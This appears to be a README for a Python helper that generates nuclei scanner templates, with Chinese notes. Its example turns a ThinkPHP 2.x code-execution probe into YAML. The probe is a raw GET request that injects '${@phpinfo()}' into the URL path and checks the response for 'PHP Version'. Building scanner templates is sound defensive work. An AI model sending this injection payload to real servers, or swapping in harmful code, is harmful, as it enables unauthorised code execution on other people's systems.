# nuclei template helper
> nuclei template 编写辅助脚本

更多编写例子查看case

```python
from nuclei import RawHTTP
http = RawHTTP()
http.set_raw(
"""GET /index.php?s=/index/index/name/$%7B@phpinfo()%7D HTTP/1.1
Host: {{Hostname}}
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: close

"""
)
http.set_body_word_matcher(
    patterns=[
        "PHP Version"
    ]
)
http.dump(
    fingers=[
        "thinkphp"
    ],
    id="ThinkPHP 2.x 任意代码执行漏洞"
)

```
生成：
```yaml
id: ThinkPHP 2.x 任意代码执行漏洞
info:
  name: 描述模板本身做了什么
  author: inhann
  severity: high
  description: 核弹级漏洞
http:
- raw:
  - |+
    GET /index.php?s=/index/index/name/$%7B@phpinfo()%7D HTTP/1.1
    Host: {{Hostname}}
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Connection: close

  unsafe: false
  cookie-reuse: false
  matchers-condition: or
  matchers:
  - type: word
    part: body
    words:
    - PHP Version
    condition: or
finger:
- thinkphp

```